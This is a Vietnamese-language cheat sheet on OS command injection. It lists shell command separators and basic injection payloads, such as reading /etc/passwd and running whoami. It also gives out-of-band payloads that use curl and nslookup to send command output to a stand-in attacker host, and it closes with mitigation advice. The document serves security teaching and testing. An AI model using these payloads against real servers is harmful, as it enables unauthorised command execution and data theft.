# 💻 OS Command Injection

## 1. 📌 Tổng quan
OS Command Injection (Shell Injection) xảy ra khi ứng dụng web thực thi các lệnh hệ điều hành thông qua shell (system, exec, popen...) với tham số do người dùng kiểm soát mà không được kiểm tra, cho phép kẻ tấn công thực thi các lệnh tùy ý trên máy chủ.

---

## 2. 💣 Kỹ thuật & Cheat Sheet

### Command Separators:
- Linux / Unix: `;`, `&`, `&&`, `|`, `||`, `\n` (`%0a`), backticks `` `cmd` ``, `$()`
- Windows: `&`, `&&`, `|`, `||`, `%0a`

### Payloads cơ bản:
```bash
# Thử nghiệm blind / time delay
& ping -c 10 127.0.0.1 &
| sleep 10 |

# Đọc file
; cat /etc/passwd
| whoami
`id`
$(uname -a)
```

### Blind Command Injection (Out-of-band OAST):
```bash
& nslookup $(whoami).attacker-collaborator.com &
& curl http://attacker-collaborator.com/`whoami` &
```

---

## 3. 🛡️ Biện pháp phòng chống (Mitigation)
1. **Tránh gọi Shell:** Sử dụng các API tích hợp sẵn của ngôn ngữ lập trình thay vì gọi lệnh hệ điều hành (ví dụ dùng `mkdir()` thay vì `system("mkdir ...")`).
2. **Parameterized / Structured Execution:** Truyền tham số dưới dạng danh sách mảng đối số (Arguments array) thay vì nối chuỗi chuỗi lệnh (ví dụ `subprocess.run(["ping", "-c", "1", ip])` trong Python).
